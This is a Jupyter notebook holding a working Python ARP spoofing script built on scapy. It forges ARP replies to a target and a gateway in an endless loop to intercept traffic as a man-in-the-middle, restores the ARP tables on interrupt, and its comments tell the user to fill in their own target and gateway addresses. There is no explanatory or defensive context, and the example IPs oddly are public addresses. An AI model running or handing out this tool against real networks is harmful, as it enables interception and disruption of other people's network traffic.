{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import scapy.all as scapy \n",
    "import time \n",
    "\n",
    "def get_mac(ip): \n",
    "\tarp_request = scapy.ARP(pdst = ip) \n",
    "\tbroadcast = scapy.Ether(dst =\"ff:ff:ff:ff:ff:ff\") \n",
    "\tarp_request_broadcast = broadcast / arp_request \n",
    "\tanswered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] \n",
    "\treturn answered_list[0][1].hwsrc \n",
    "\n",
    "def spoof(target_ip, spoof_ip): \n",
    "\tpacket = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip) \n",
    "\tscapy.send(packet, verbose = False) \n",
    "\n",
    "\n",
    "def restore(destination_ip, source_ip): \n",
    "\tdestination_mac = get_mac(destination_ip) \n",
    "\tsource_mac = get_mac(source_ip) \n",
    "\tpacket = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) \n",
    "\tscapy.send(packet, verbose = False) \n",
    "\t\n",
    "\n",
    "target_ip = \"140.34.87.35\"        # (my laptop’s IP address)you should give your target IP\n",
    "gateway_ip = \"2.187.96.67\"      #(my phone’s IP address)you should give your gateway IP\n",
    "\n",
    "try: \n",
    "\tsent_packets_count = 0\n",
    "\twhile True: \n",
    "\t\tspoof(target_ip, gateway_ip) \n",
    "\t\tspoof(gateway_ip, target_ip) \n",
    "\t\tsent_packets_count = sent_packets_count + 2\n",
    "\t\tprint(\"\\r[*] Packets Sent \"+str(sent_packets_count), end =\"\") \n",
    "\t\ttime.sleep(2) \t\t# Waits for two seconds \n",
    "\n",
    "except KeyboardInterrupt: \n",
    "\tprint(\"\\nCtrl + C pressed.............Exiting\") \n",
    "\trestore(gateway_ip, target_ip) \n",
    "\trestore(target_ip, gateway_ip) \n",
    "\tprint(\"[+] Arp Spoof Stopped\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
